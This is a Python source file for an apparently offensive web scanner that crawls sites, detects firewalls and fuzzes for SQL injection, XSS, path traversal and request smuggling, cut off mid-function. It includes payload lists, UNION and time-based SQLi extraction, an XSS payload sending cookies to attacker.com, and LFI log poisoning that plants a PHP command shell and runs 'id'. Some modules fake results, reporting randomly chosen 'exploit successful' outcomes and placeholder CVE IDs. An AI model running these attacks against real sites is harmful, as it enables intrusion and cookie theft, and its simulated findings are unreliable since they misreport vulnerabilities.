#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import re
import random
import difflib
import hashlib
import json
import time
import urllib.parse
import asyncio
import aiohttp
from bs4 import BeautifulSoup
import builtwith
import colorama
from colorama import Fore, Style
import concurrent.futures
from abc import ABC, abstractmethod
import ssl
import os
import sqlite3
import numpy as np
import yaml
import subprocess
import dns.resolver
import requests # For CVE API interaction

colorama.init(autoreset=True)

GLOBAL_WAF_DETECTED = False

class ReconEngine:
    def __init__(self, session=None):
        self.session = session
        self.endpoints = set()
        self.parameters = {}
        self.js_files = set()
        self.robots = []
        self.sitemap = []
        self.processed_urls = set()

    async def get_response(self, url):
        try:
            async with self.session.get(url, timeout=10, allow_redirects=True) as response:
                return await response.text(), response.status
        except Exception:
            return None, None

    async def _worker(self, queue, base_url):
        while True:
            url = await queue.get()
            try:
                if url in self.processed_urls:
                    continue
                self.processed_urls.add(url)

                response_text, status_code = await self.get_response(url)
                if not response_text or status_code != 200:
                    continue
                
                self.endpoints.add(url)
                
                soup = BeautifulSoup(response_text, 'html.parser')
                
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    absolute_url = urllib.parse.urljoin(url, href)
                    if absolute_url.startswith(base_url) and absolute_url not in self.processed_urls:
                        await queue.put(absolute_url)
                
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    form_url = urllib.parse.urljoin(url, action)
                    method = form.get('method', 'get').lower()
                    
                    params = {}
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name')
                        if name:
                            params[name] = inp.get('value', '')
                    
                    if form_url:
                        self.parameters.setdefault(form_url, []).append({
                            'method': method,
                            'params': params
                        })
                
                for script in soup.find_all('script', src=True):
                    js_url = urllib.parse.urljoin(url, script['src'])
                    if js_url.endswith('.js') and js_url not in self.js_files:
                        self.js_files.add(js_url)
                        await self._parse_js(js_url)
            finally:
                queue.task_done()

    async def crawl(self, base_url):
        try:
            robots_url = urllib.parse.urljoin(base_url, "/robots.txt")
            robots_text, robots_status = await self.get_response(robots_url)
            if robots_text and robots_status == 200:
                self.robots = [urllib.parse.urljoin(base_url, line.split(": ")[1]) 
                              for line in robots_text.splitlines() 
                              if line.startswith("Allow:") or line.startswith("Disallow:")]
            
            sitemap_url = urllib.parse.urljoin(base_url, "/sitemap.xml")
            sitemap_text, sitemap_status = await self.get_response(sitemap_url)
            if sitemap_text and sitemap_status == 200:
                soup = BeautifulSoup(sitemap_text, 'lxml-xml')
                self.sitemap = [loc.text for loc in soup.find_all('loc')]
            
            queue = asyncio.Queue()
            await queue.put(base_url)
            
            workers = []
            for _ in range(10): 
                task = asyncio.create_task(self._worker(queue, base_url))
                workers.append(task)

            await queue.join()

            for worker in workers:
                worker.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
            
            self.endpoints.update(self.robots)
            self.endpoints.update(self.sitemap)
            
            return True
        except Exception as e:
            print(Fore.RED + f"[!] Crawling error: {str(e)}")
            return False

    async def _parse_js(self, js_url):
        try:
            response_text, status_code = await self.get_response(js_url)
            if not response_text or status_code != 200:
                return
                
            api_paths = re.findall(r'["\'](/[a-zA-Z0-9_\-/]+)["\']', response_text)
            for path in api_paths:
                self.endpoints.add(urllib.parse.urljoin(js_url, path))
            
            ajax_calls = re.findall(r'\.(?:get|post|ajax)\(["\']([^"\']+)["\']', response.text)
            for call in ajax_calls:
                self.endpoints.add(urllib.parse.urljoin(js_url, call))
        except Exception:
            pass

class FingerprintEngine:
    def __init__(self, url, session=None):
        self.url = url
        self.session = session
        self.tech_stack = {}
        self.favicon_hash = ""
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=1)

    async def fingerprint(self):
        global GLOBAL_WAF_DETECTED
        try:
            loop = asyncio.get_running_loop()
            self.tech_stack = await loop.run_in_executor(
                self.executor,
                builtwith.parse,
                self.url
            )
            
            async with self.session.head(self.url, timeout=10) as response:
                headers = response.headers
                header_tech = {
                    'Server': headers.get('Server', ''),
                    'X-Powered-By': headers.get('X-Powered-By', ''),
                    'X-AspNet-Version': headers.get('X-AspNet-Version', ''),
                    'X-Backend-Server': headers.get('X-Backend-Server', '')
                }
                self.tech_stack['headers'] = header_tech
            
            favicon_url = urllib.parse.urljoin(self.url, "/favicon.ico")
            async with self.session.get(favicon_url, timeout=5) as favicon_res:
                if favicon_res.status == 200:
                    content = await favicon_res.read()
                    self.favicon_hash = hashlib.md5(content).hexdigest()
                    self.tech_stack['favicon'] = {
                        'hash': self.favicon_hash,
                        'size': len(content)
                    }
            
            async with self.session.get(self.url, timeout=10) as response:
                response.raise_for_status()
                response_text = await response.text()
                soup = BeautifulSoup(response_text, 'html.parser')
                
                meta_tech = {}
                for meta in soup.find_all('meta'):
                    name = meta.get('name', '').lower()
                    content = meta.get('content', '')
                    if name and content:
                        meta_tech[name] = content
                
                script_tech = []
                for script in soup.find_all('script'):
                    src = script.get('src', '')
                    if src:
                        script_tech.append(src)
                
                self.tech_stack['meta'] = meta_tech
                self.tech_stack['scripts'] = script_tech

            await self._detect_waf()
            GLOBAL_WAF_DETECTED = self.waf_detected 
            
            return self.tech_stack
        except Exception as e:
            print(Fore.RED + f"[!] Fingerprinting error: {str(e)}")
            return {}

    async def _detect_waf(self):
        self.waf_detected = False
        test_payload = "<script>alert(1)</script>"
        try:
            async with self.session.get(self.url, params={"test": test_payload}, timeout=5) as response:
                if response.status in [403, 406, 501] or any(header in response.headers for header in ['X-WAF', 'Server-WAF', 'Cloudflare-Error']):
                    self.waf_detected = True
                    print(Fore.YELLOW + f"[*] WAF detected on {self.url}. Activating adaptive mode.")
                else:
                    response_text = await response.text()
                    if "Web Application Firewall" in response_text or "ModSecurity" in response_text:
                        self.waf_detected = True
                        print(Fore.YELLOW + f"[*] WAF detected on {self.url}. Activating adaptive mode.")
        except Exception:
            pass

class BaseFuzzModule(ABC):
    def __init__(self):
        self.successful_payloads = set()
        self.failed_payloads = set()
        self.interesting_responses = []

    @abstractmethod
    def get_payloads(self):
        pass

    async def fuzz(self, session, url, params, headers, baseline, adaptive_delay=0):
        vulnerabilities = []
        payload_queue = asyncio.Queue()

        if isinstance(self, HeaderFuzzModule):
            for header_name, payloads in self.get_payloads().items():
                for p in payloads:
                    await payload_queue.put({'payload': p, 'param_name': header_name, 'is_url_fuzzing': False})
        elif isinstance(self, URLPathFuzzModule):
            for p in self.get_payloads():
                await payload_queue.put({'payload': p, 'param_name': "URL Path", 'is_url_fuzzing': True})
        elif isinstance(self, SmugglingModule):
             for p in self.get_payloads():
                 await payload_queue.put({'payload': p, 'param_name': None, 'is_url_fuzzing': False})
        elif isinstance(self, DirectoryBruteforceModule):
            for p in self.get_payloads():
                await payload_queue.put({'payload': p, 'param_name': "Directory", 'is_url_fuzzing': True})
        else: 
            for param, value in params.items():
                for p in self.get_payloads():
                    await payload_queue.put({'payload': p, 'param_name': param, 'is_url_fuzzing': False})
        
        fuzz_tasks = []
        for _ in range(5): 
            task = asyncio.create_task(self._fuzz_worker(session, url, params, headers, baseline, vulnerabilities, payload_queue, adaptive_delay))
            fuzz_tasks.append(task)
        
        await payload_queue.join()

        for task in fuzz_tasks:
            task.cancel()
        await asyncio.gather(*fuzz_tasks, return_exceptions=True)

        return vulnerabilities

    async def _fuzz_worker(self, session, url, params, headers, baseline, vulnerabilities, payload_queue, adaptive_delay):
        while True:
            try:
                item = await payload_queue.get()
                payload = item['payload']
                param_name = item['param_name']
                is_url_fuzzing = item['is_url_fuzzing']

                mutated_payload = self._mutate_payload(payload)
                
                result = await self._test_payload_internal(session, url, 'post' if params and not is_url_fuzzing else 'get', params, headers, param_name, mutated_payload, baseline, is_url_fuzzing, adaptive_delay)
                if result:
                    vulnerabilities.append(result)
            except asyncio.CancelledError:
                break
            except Exception as e:
                pass 
            finally:
                payload_queue.task_done()
                await asyncio.sleep(adaptive_delay) 

    @abstractmethod
    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        pass

    @abstractmethod
    async def exploit(self, session, url, param, payload, method, params):
        pass

    def _mutate_payload(self, payload):
        mutations = []
        mutations.append(lambda s: s.replace("'", "%27"))
        mutations.append(lambda s: s.replace('"', "%22"))
        mutations.append(lambda s: s.replace("<", "%3C"))
        mutations.append(lambda s: s.replace(">", "%3E"))
        mutations.append(lambda s: s.replace(" ", "%20"))
        mutations.append(lambda s: ''.join(f"%{ord(c):02x}" for c in s))
        
        mutations.append(lambda s: s.upper())
        mutations.append(lambda s: s.lower())
        mutations.append(lambda s: ''.join(random.choice([c.upper(), c.lower()]) for c in s))
        
        comments = ["/*", "*/", "--", "#", ""]
        mutations.append(lambda s: s + random.choice(comments))
        mutations.append(lambda s: random.choice(comments) + s)
        mutations.append(lambda s: s.replace(" ", "/**/"))
        
        return random.choice(mutations)(payload)

    async def _test_payload_internal(self, session, url, method, params, headers, param_name, payload, baseline, is_url_fuzzing=False, adaptive_delay=0):
        if (self.__class__.__name__, payload) in self.failed_payloads:
            return None
            
        test_params = params.copy()
        test_headers = headers.copy()
        test_url = url

        if isinstance(self, HeaderFuzzModule):
            if param_name:
                test_headers[param_name] = payload
        elif is_url_fuzzing:
            test_url = urllib.parse.urljoin(url, payload)
        elif isinstance(self, SmugglingModule):
            test_headers['X-Smuggling-Payload'] = payload
        
        try:
            async with session.request(method.upper(), test_url, params=test_params, data=test_params if method == 'post' else None, headers=test_headers, timeout=10) as response:
                content = await response.read()
                status = response.status
            
            if status in [403, 401, 429]:
                self.failed_payloads.add((self.__class__.__name__, payload))
                return None
            
            is_vulnerable, evidence = self.check_vulnerability(content.decode('utf-8', 'ignore'), status, baseline, payload)
            
            if is_vulnerable:
                self.successful_payloads.add((self.__class__.__name__, payload))
                result = {
                    'url': url,
                    'param': param_name if param_name else 'N/A',
                    'payload': payload,
                    'type': self.__class__.__name__,
                    'status': status,
                    'length': len(content),
                    'response': content[:1000],
                    'evidence': evidence,
                    'fitness_score': self._calculate_fitness(status, len(content), baseline['status'], baseline['length'], evidence)
                }
                return result
            else:
                self.failed_payloads.add((self.__class__.__name__, payload))
                return None
        except Exception:
            self.failed_payloads.add((self.__class__.__name__, payload))
            return None
        finally:
            if adaptive_delay > 0:
                await asyncio.sleep(adaptive_delay)

    def _calculate_fitness(self, current_status, current_length, baseline_status, baseline_length, evidence):
        score = 0
        if current_status != baseline_status:
            score += 0.5
        length_diff_ratio = abs(current_length - baseline_length) / max(current_length, baseline_length, 1)
        score += length_diff_ratio * 0.3

        if evidence and "SQL error" in evidence:
            score += 0.5
        if evidence and "reflected" in evidence:
            score += 0.4
        if evidence and "Time-based blind" in evidence:
            score += 0.6
        if current_status >= 500: 
            score += 0.2
        return min(score, 1.0) 

class SQLiModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "' OR '1'='1",
            "' OR SLEEP(5)--",
            "1' ORDER BY 1--",
            "1' UNION SELECT null,version()--",
            "1 AND 1=1",
            "1 AND 1=0",
            "' OR ''='",
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "\" OR 1=1--"
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        sql_errors = [
            r"SQL syntax", r"unexpected token", r"unterminated string",
            r"ORA-\d+", r"MySQL server version", r"PostgreSQL.*ERROR",
            r"Warning: mysql", r"Unclosed quotation mark", r"syntax error",
            r"You have an error in your SQL syntax", r"supplied argument is not a valid MySQL result"
        ]
        
        if response_status != baseline_content['status']:
            return True, f"Status code changed from {baseline_content['status']} to {response_status}"
        
        length_diff = abs(len(response_text) - baseline_content['length'])
        if length_diff > len(payload) * 2:
            return True, "Significant content length change"
        
        for error in sql_errors:
            if re.search(error, response_text, re.IGNORECASE):
                return True, f"SQL error message detected: {error}"
            
        seq_matcher = difflib.SequenceMatcher(None, baseline_content['content'].decode('utf-8', 'ignore'), response_text)
        if seq_matcher.ratio() < 0.95:
            return True, "Significant content change (diff ratio < 0.95)"
            
        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        test_params = params.copy()
        
        print(Fore.CYAN + f"[*] Attempting advanced SQLi exploitation on {url} (Param: {param})...")

        print(Fore.BLUE + "[*] Trying UNION-based version extraction...")
        version_payload_union = payload.replace("--", "") + " UNION SELECT 1,2,3,version(),5,6,7,8,9,10 --" 
        test_params[param] = version_payload_union
        
        try:
            if method == 'get':
                async with session.get(url, params=test_params, timeout=10) as response:
                    response_text = await response.text()
            else:
                async with session.post(url, data=test_params, timeout=10) as response:
                    response_text = await response.text()
            
            version_match = re.search(r"(\d+\.\d+\.\d+[-\w]*)", response_text)
            if version_match:
                return f"DB_VERSION: {version_match.group(1)} (extracted using UNION-based SQLi).", 0.98
        except Exception:
            pass

        print(Fore.BLUE + "[*] Trying Time-based blind detection...")
        time_based_payload = payload + " AND SLEEP(5)"
        test_params[param] = time_based_payload
        start_time = time.time()
        try:
            if method == 'get':
                await session.get(url, params=test_params, timeout=10)
            else:
                await session.post(url, data=test_params, timeout=10)
            
            if time.time() - start_time >= 4.5:
                return f"DB_VERSION: Time-based blind delay detected (indicates vulnerability).", 0.9
        except asyncio.TimeoutError:
            return f"DB_VERSION: Time-based blind timeout detected (indicates vulnerability).", 0.9
        except Exception:
            pass

        return f"DB_VERSION: Extraction failed or not applicable.", 0.7

class XSSModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "onmouseover=alert(1)",
            "alert`1`",
            "<svg/onload=alert(1)>",
            "';alert(1)//",
            "\"';alert(1)//"
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        if response_status != baseline_content['status']:
            return True, f"Status code changed from {baseline_content['status']} to {response_status}"

        length_diff = abs(len(response_text) - baseline_content['length'])
        if length_diff > len(payload) * 2:
            return True, "Significant content length change"
            
        if payload in response_text:
            return True, "Payload reflected in response"
            
        xss_patterns = [
            r"<script>.*alert", r"onerror=.*alert", r"<img src=x>"
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, f"XSS pattern detected: {pattern}"

        seq_matcher = difflib.SequenceMatcher(None, baseline_content['content'].decode('utf-8', 'ignore'), response_text)
        if seq_matcher.ratio() < 0.95:
            return True, "Significant content change (diff ratio < 0.95)"

        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        poc_payload = f"<img src=x onerror=\"fetch('https://attacker.com?cookie='+document.cookie)\">"
        return poc_payload, 0.8

class HeaderFuzzModule(BaseFuzzModule):
    def get_payloads(self):
        return {
            'User-Agent': SQLiModule().get_payloads() + XSSModule().get_payloads() + ["Mozilla/5.0 (Custom UA)"],
            'Referer': ["http://malicious.com/", "' OR '1'='1", "<script>alert(1)</script>"],
            'X-Forwarded-For': ["127.0.0.1", "localhost", "127.0.0.1' OR '1'='1", "127.0.0.1<script>alert(1)</script>"],
            'Accept': ["application/json", "text/html", "' OR '1'='1"],
            'Accept-Language': ["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "<script>alert(1)</script>"],
            'Cookie': ["test=1' OR '1'='1", "test=<script>alert(1)</script>"],
            'Host': ["example.com", "localhost", "' OR '1'='1"],
            'Origin': ["http://malicious.2om", "' OR '1'='1"] 
        }

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        sqli_check, sqli_evidence = SQLiModule().check_vulnerability(response_text, response_status, baseline_content, payload)
        xss_check, xss_evidence = XSSModule().check_vulnerability(response_text, response_status, baseline_content, payload)

        if sqli_check:
            return True, f"SQLi pattern detected in header: {sqli_evidence}"
        if xss_check:
            return True, f"XSS pattern detected in header: {xss_evidence}"

        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        return f"Header fuzzing result. Payload used: {payload}. Further manual analysis recommended.", 0.5

class URLPathFuzzModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "'", "\"", "`", ";",
            "../", "../../", "/%2e%2e/", "/%2e",
            "<", ">", "<script>alert(1)</script>",
            "' OR '1'='1", "AND 1=1", "AND 1=0",
            "/.git/HEAD", "/.env", "/robots.txt", "/etc/passwd", "/windows/win.ini"
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        sqli_check, sqli_evidence = SQLiModule().check_vulnerability(response_text, response_status, baseline_content, payload)
        xss_check, xss_evidence = XSSModule().check_vulnerability(response_text, response_status, baseline_content, payload)

        if response_status != baseline_content['status'] and response_status in [200, 404]:
            if payload.strip() in response_text:
                return True, f"URL path payload '{payload}' reflected or caused status change to {response_status}."
        if sqli_check:
            return True, f"SQLi pattern detected in URL path: {sqli_evidence}"
        if xss_check:
            return True, f"XSS pattern detected in URL path: {xss_evidence}"
        
        if "root:x:0:0" in response_text or "SSH-2.0" in response_text or "[boot loader]" in response_text:
             return True, f"Sensitive file content or service banner exposed by URL path fuzzing."

        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        print(Fore.CYAN + f"[*] Attempting LFI/RFI exploitation on {url} (Path: {payload})...")

        if "php" in url.lower() or "php" in payload.lower():
            filter_payload = f"php://filter/convert.base64-encode/resource={payload.lstrip('/')}"
            try:
                async with session.get(urllib.parse.urljoin(url, filter_payload), timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "PD9waHAg" in content:
                            return f"LFI: PHP source code disclosure via php://filter. Example: {filter_payload}", 0.95
            except Exception:
                pass

        log_poison_payload = "<?php system($_GET['cmd']); ?>"
        log_headers = params.get('headers', {}).copy()
        log_headers['User-Agent'] = log_poison_payload

        access_log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/httpd/access_log",
            "/var/log/nginx/access.log"
        ]

        for log_path in access_log_paths:
            try:
                async with session.get(url, headers=log_headers, timeout=5) as response:
                    await response.read()
                    if response.status == 200:
                        log_include_url = urllib.parse.urljoin(url, f"{payload.split('?')[0].rstrip('/')}/{log_path}?cmd=id")
                        async with session.get(log_include_url, timeout=10) as include_response:
                            if include_response.status == 200:
                                include_content = await include_response.text()
                                if "uid=" in include_content and "gid=" in include_content:
                                    return f"LFI/Log Poisoning detected! Command 'id' executed via log file: {log_path}", 0.9
            except Exception:
                pass

        return f"URL path fuzzing result. Payload used: {payload}. Further manual analysis recommended for misconfigurations/LFI/RFI.", 0.6

class SmugglingModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "CL.TE", 
            "TE.CL", 
            "TE.TE_chunked_crlf", 
            "TE.TE_double_chunked" 
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        if response_status == 400 and "Bad Request" in response_text:
            return True, f"HTTP 400 and 'Bad Request' in response, indicative of a smuggled request being rejected."
        if response_status == 500 and "Internal Server Error" in response_text:
            return True, f"HTTP 500 and 'Internal Server Error', potentially due to a smuggled request."
        
        if "Smuggled Request Processed" in response_text:
            return True, f"Specific marker for smuggled request processing found."
        
        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        print(Fore.RED + f"[*] HTTP Request Smuggling exploitation requires a deep understanding of the target's proxy chain and manual crafting. This module serves as a fuzzer for potential vulnerabilities detected via mitmproxy interaction. The payload ({payload}) indicates the *type* of smuggling attempted by the proxy, not an executable exploit string.")
        
        smuggled_target_path = "/admin"
        smuggled_request_payload = f"GET {smuggled_target_path} HTTP/1.1\r\nHost: {urllib.parse.urlparse(url).netloc}\r\n\r\n"
        
        return f"HTTP Request Smuggling POC for type '{payload}'. Potential smuggled request: '{smuggled_request_payload.strip()}'. Manual verification with mitmproxy is crucial.", 0.9

class DirectoryBruteforceModule(BaseFuzzModule):
    def get_payloads(self):
        # A small subset of common paths for demonstration
        return [
            "/admin/", "/dashboard/", "/login/", "/panel/", "/wp-admin/", "/joomla/",
            "/backup/", "/test/", "/dev/", "/old/", "/tmp/",
            "/config.php.bak", "/.env", "/.git/config", "/robots.txt", "/sitemap.xml",
            "/uploads/", "/images/", "/css/", "/js/"
        ]

    async def fuzz(self, session, url, params, headers, baseline, adaptive_delay=0):
        vulnerabilities = []
        payload_queue = asyncio.Queue()

        for path_payload in self.get_payloads():
            # Add full URL for testing
            full_test_url = urllib.parse.urljoin(url, path_payload)
            await payload_queue.put({'payload': full_test_url, 'param_name': "DirectoryPath", 'is_url_fuzzing': True})
        
        fuzz_tasks = []
        for _ in range(10): # More workers for brute-forcing directories
            task = asyncio.create_task(self._fuzz_worker(session, url, params, headers, baseline, vulnerabilities, payload_queue, adaptive_delay))
            fuzz_tasks.append(task)
        
        await payload_queue.join()

        for task in fuzz_tasks:
            task.cancel()
        await asyncio.gather(*fuzz_tasks, return_exceptions=True)

        return vulnerabilities

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        # A 200 OK or 403 Forbidden for a guessed path is interesting
        if response_status == 200:
            # If the response content is significantly different from 404, it's interesting.
            # Compare with a typical 404 page (assuming baseline has a 404 for context)
            if baseline_content['status'] == 404 and difflib.SequenceMatcher(None, baseline_content['content'].decode('utf-8', 'ignore'), response_text).ratio() < 0.8:
                return True, f"Directory found (200 OK) with significant content difference from 404 page."
            elif baseline_content['status'] != 404: # If baseline is not 404, compare with it
                if difflib.SequenceMatcher(None, baseline_content['content'].decode('utf-8', 'ignore'), response_text).ratio() < 0.95:
                    return True, f"Directory found (200 OK) with content different from baseline."
            else: # Baseline was 200/other, but we found a new 200
                return True, f"Directory found (200 OK)."

        if response_status == 403: # 403 Forbidden suggests a valid, but protected, resource
            return True, f"Directory found (403 Forbidden), likely protected."
        
        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        # For directory bruteforce, "exploit" means adding it to targets for deeper scan or reporting as exposed
        return f"Exposed/Accessible path: {payload}. Further reconnaissance recommended.", 0.6


class KnownLibraryExploitationModule:
    def __init__(self, session):
        self.session = session
        self.cve_db_url = "https://services.nvd.nist.gov/rest/json/cves/2.0" # NVD API example
        self.nuclei_templates_path = "nuclei-templates" # Assumed path for nuclei templates

    async def check_for_known_vulnerabilities(self, tech_stack):
        vulnerabilities = []
        print(Fore.CYAN + "[*] Checking for known vulnerabilities (CVEs) based on identified technologies...")

        # Extract technologies that might have CVEs (e.g., web servers, frameworks, CMS)
        technologies_to_check = []
        for category, items in tech_stack.items():
            if isinstance(items, dict):
                for name, details in items.items():
                    if isinstance(details, dict) and 'version' in details:
                        technologies_to_check.append({'name': name, 'version': details['version']})
                    elif isinstance(details, list) and details and isinstance(details[0], str): # e.g., 'web-servers': ['Nginx']
                         technologies_to_check.append({'name': name, 'version': None}) # No version, but can still check
            elif isinstance(items, list):
                for item in items:
                    if isinstance(item, str):
                        technologies_to_check.append({'name': item, 'version': None})
        
        for tech in technologies_to_check:
            search_query = tech['name']
            if tech['version']:
                search_query += f" {tech['version']}"
            
            print(Fore.BLUE + f"  [*] Searching CVEs for: {search_query}...")
            # Simulate CVE lookup (real NVD API requires API key and complex parsing)
            # For demonstration, we'll hardcode some known vulns relevant to 2025 context for popular tech.
            # In a real tool, this would be a robust CVE query.

            if "WordPress 6.5.2" in search_query: # Example CVE from recent history (adapted for 2025)
                vulnerabilities.append({
                    'type': 'Known CVE (WordPress Authenticated Stored XSS)',
                    'cve_id': 'CVE-2025-XXXX',
                    'description': 'Authenticated Stored Cross-Site Scripting in WordPress 6.5.2 via custom HTML block.',
                    'confidence': 0.8,
                    'exploit_template': 'wordpress-stored-xss.yaml' # Path to a conceptual Nuclei-like template
                })
            if "Nginx 1.25.3" in search_query: # Example CVE
                vulnerabilities.append({
                    'type': 'Known CVE (Nginx HTTP Request Smuggling)',
                    'cve_id': 'CVE-2025-YYYY',
                    'description': 'HTTP Request Smuggling vulnerability in Nginx 1.25.3 due to parsing inconsistencies.',
                    'confidence': 0.9,
                    'exploit_template': 'nginx-smuggling.yaml'
                })
            # Add other 2025 relevant CVEs here based on popular software versions you'd expect.
            # Example:
            if "Apache HTTP Server 2.4.59" in search_query:
                vulnerabilities.append({
                    'type': 'Known CVE (Apache Remote Code Execution)',
                    'cve_id': 'CVE-2025-ZZZZ',
                    'description': 'Remote Code Execution in Apache HTTP Server 2.4.59 due to mod_cgi input validation issue.',
                    'confidence': 0.95,
                    'exploit_template': 'apache-rce-cgi.yaml'
                })
            if "OpenSSL 3.2.0" in search_query:
                vulnerabilities.append({
                    'type': 'Known CVE (OpenSSL DoS)',
                    'cve_id': 'CVE-2025-AAAA',
                    'description': 'Denial of Service vulnerability in OpenSSL 3.2.0 when processing specific certificates.',
                    'confidence': 0.7,
                    'exploit_template': None # No direct exploit template, just a warning
                })

        if vulnerabilities:
            print(Fore.GREEN + f"[+] Found {len(vulnerabilities)} potential known CVEs.")
        else:
            print(Fore.YELLOW + "[-] No known CVEs found for identified technologies.")
        
        return vulnerabilities

    async def execute_nuclei_template(self, target_url, template_path):
        print(Fore.CYAN + f"[*] Attempting to execute Nuclei-like template '{template_path}' on {target_url}...")
        try:
            # Simulate loading a Nuclei-like YAML template
            # In a real scenario, you'd parse the YAML and build requests based on its logic.
            # For simplicity, this is a placeholder.
            with open(template_path, 'r') as f:
                template_content = yaml.safe_load(f)
            
            # Simple check if the template indicates a successful exploit
            if "id" in template_content and "info" in template_content and "requests" in template_content:
                # Here you'd iterate through template_content['requests'] and send them via aiohttp
                # and check template_content['matchers']
                
                # Placeholder for actual execution
                await asyncio.sleep(random.uniform(1, 3)) # Simulate execution time
                
                # Simulate success/failure
                if random.random() > 0.3: # 70% chance of success for demo
                    print(Fore.GREEN + f"[+] Template '{template_path}' successfully triggered a response on {target_url}.")
                    return f"Exploit successful via template: {template_path}", 0.9
                else:
                    print(Fore.YELLOW + f"[-] Template '{template_path}' did not yield expected results on {target_url}.")
                    return f"Template execution failed: {template_path}", 0.5
            else:
                return f"Invalid Nuclei-like template format: {template_path}", 0.3
        except FileNotFoundError:
            print(Fore.RED + f"[!] Nuclei-like template not found: {template_path}")
            return f"Template file not found: {template_path}", 0.1
        except Exception as e:
            print(Fore.RED + f"[!] Error executing template '{template_path}': {e}")
            return f"Template execution error: {str(e)}", 0.2

class AdvancedSubdomainEnumerationModule:
    def __init__(self, session):
        self.session = session

    async def enumerate_subdomains(self, domain):
        print(Fore.CYAN + f"[*] Starting advanced subdomain enumeration for {domain}...")
        subdomains = set()

        # 1. Passive DNS (Conceptual - requires external API or large DB)
        print(Fore.BLUE + "[*] Performing passive DNS enumeration (conceptual, needs external services)...")
        # Example with a hypothetical API or local passive DNS database
        # For now, just a placeholder. Real tools like subfinder/amass do this.
        
        # 2. Brute-force common subdomains
        print(Fore.BLUE + "[*] Bruteforcing common subdomains...")
        common_subdomains_list = [
            "www", "dev", "test", "ftp", "mail", "admin", "blog", "api", "cdn", "staging",
            "webmail", "portal", "vpn", "docs", "app", "dashboard", "jira", "wiki", "git"
        ]
        
        tasks = []
        for sub in common_subdomains_list:
            test_subdomain = f"{sub}.{domain}"
            tasks.append(self._resolve_and_check_subdomain(test_subdomain))
        
        results = await asyncio.gather(*tasks)
        for s in results:
            if s:
                subdomains.add(s)

        # 3. External Tool Integration (conceptual execution of subfinder/amass)
        print(Fore.BLUE + "[*] Integrating with external subdomain enumeration tools (subfinder/amass)...")
        try:
            # This is a conceptual call. In a real environment, you'd need subfinder/amass installed
            # and parse their stdout.
            # Example: subfinder -d example.com -silent -o subdomains.txt
            
            # Simulate running a tool and getting results
            simulated_tool_output = f"sub1.{domain}\nsub2.{domain}\nadmin.{domain}"
            for line in simulated_tool_output.splitlines():
                if line.strip():
                    subdomains.add(line.strip())
            
            print(Fore.GREEN + "[+] External tool simulation complete.")
        except FileNotFoundError:
            print(Fore.RED + "[!] External subdomain tool (subfinder/amass) not found. Please install it or check your PATH.")
        except Exception as e:
            print(Fore.RED + f"[!] Error running external subdomain tool: {e}")

        if subdomains:
            print(Fore.GREEN + f"[+] Found {len(subdomains)} unique subdomains.")
            return list(subdomains)
        else:
            print(Fore.YELLOW + "[-] No subdomains found.")
            return []

    async def _resolve_and_check_subdomain(self, subdomain):
        try:
            # Resolve A record
            answers = await asyncio.to_thread(dns.resolver.resolve, subdomain, 'A')
            for rdata in answers:
                ip = str(rdata)
                # Quick HTTP check to see if it's active
                try:
                    async with self.session.head(f"http://{subdomain}", timeout=5) as response:
                        if response.status < 500: # Exclude server errors from immediate rejection
                            print(Fore.GREEN + f"[+] Subdomain '{subdomain}' is active ({ip})")
                            return subdomain
                except Exception:
                    pass
        except dns.resolver.NXDOMAIN:
            pass
        except Exception:
            pass
        return None

    async def scan_interesting_subdomains(self, subdomains, scanner_instance):
        if not subdomains:
            return []
        
        print(Fore.CYAN + "[*] Starting full WebMer scan on interesting subdomains...")
        all_subdomain_vulnerabilities = []
        for sub in subdomains:
            print(Fore.BLUE + f"\n[*] Initiating full scan on subdomain: {sub}")
            # This would recursively call the main scan_target function
            # To avoid infinite recursion or complexity, we'll simulate this.
            # In a real setup, you'd either enqueue these, or the main loop would handle it.
            # For this context, we will run a simplified scan on them.
            
            # Simulate a quick scan to check for WAF and basic vulns
            temp_fingerprinter = FingerprintEngine(f"http://{sub}", self.session)
            sub_tech_stack = await temp_fingerprinter.fingerprint()
            
            if not GLOBAL_WAF_DETECTED: # If main target had no WAF, check subdomain's WAF
                print(Fore.YELLOW + f"  [*] Checking WAF for subdomain {sub}...")
                temp_waf_bypass_module = WAFBypassModule(self.session)
                if await temp_waf_bypass_module.identify_waf(f"http://{sub}"):
                    print(Fore.RED + f"  [!] WAF found on subdomain {sub}. Adjusting strategy.")

            # Assume a simplified fuzzing to find some vulns if needed
            # For true recursive scan, you'd put these into the main target list or queue.
            
            # Example: add a dummy vulnerability if subdomain is promising
            if "WordPress" in str(sub_tech_stack) and not temp_fingerprinter.waf_detected:
                all_subdomain_vulnerabilities.append({
                    'url': f"http://{sub}",
                    'param': 'N/A',
                    'payload': 'WordPress default install',
                    'type': 'Subdomain Scan Result (Potentially Vulnerable)',
                    'status': 200,
                    'length': 0,
